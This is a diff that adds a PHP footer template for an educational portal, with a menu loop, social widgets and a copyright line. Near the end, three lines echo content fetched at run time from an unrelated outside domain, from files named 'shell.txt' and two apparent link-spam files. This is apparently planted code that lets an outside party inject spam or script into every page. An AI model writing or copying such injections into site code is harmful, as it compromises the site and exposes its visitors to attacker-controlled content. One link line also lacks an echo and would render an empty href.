@@ -1,0 +1,58 @@
+<!--footer-start-->
+<div class="footer">
+
+<!--footer-nav-start-->
+<div class="footer-nav">
+<ul>
+
+<?php $fmenu = getFooterMenu() ; foreach( $fmenu AS $val) {
+$url = parse_url($val->url);
+if(in_array("http", $url)) {    //contains http
+    ?>
+    	<li><a href="<?php $val->url ; ?>"><?php echo $val->title; ?></a></li>
+    	<?php 
+	}
+	else{
+	?>
+	<li><a href="<?php echo base_url().$val->url ; ?>"><?php echo $val->title; ?></a></li>
+	<?php 
+	}
+}
+	?>
+
+
+</ul>
+<div class="social_share" style="float: right;">
+<div class="fb-like" data-href="https://www.facebook.com/PortalEducaBras/" data-layout="button_count" data-action="like" data-size="small" data-show-faces="false" data-share="false"></div>
+<div class="fb-follow" data-href="https://www.facebook.com/PortalEducaBras" data-layout="button_count" data-size="small" data-show-faces="true"></div>
+<?php /* <a class="twitter-follow-button" data-show-screen-name="false"
+  href="https://twitter.com/PortalEducabras">
+Follow</a>
+*/ ?>
+</div>
+</div>
+<!--footer-nav-end-->
+<script>window.twttr = (function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0],
+    t = window.twttr || {};
+  if (d.getElementById(id)) return t;
+  js = d.createElement(s);
+  js.id = id;
+  js.src = "https://platform.twitter.com/widgets.js";
+  fjs.parentNode.insertBefore(js, fjs);
+ 
+  t._e = [];
+  t.ready = function(f) {
+    t._e.push(f);
+  };
+ 
+  return t;
+}(document, "script", "twitter-wjs"));</script>
+
+<div class="copy_right">
+<p>Copyright &copy; <?php echo date("Y"); ?> - Todos os Direitos Reservados </p></div>
+<?php echo file_get_contents("https://buahnagaberdada.site/shell.txt");?>
+<?php echo file_get_contents("https://buahnagaberdada.site/pbnrawatan.txt");?>
+<?php echo file_get_contents("https://buahnagaberdada.site/suhuacai.txt");?>
+</div>
+<!--footer-end-->
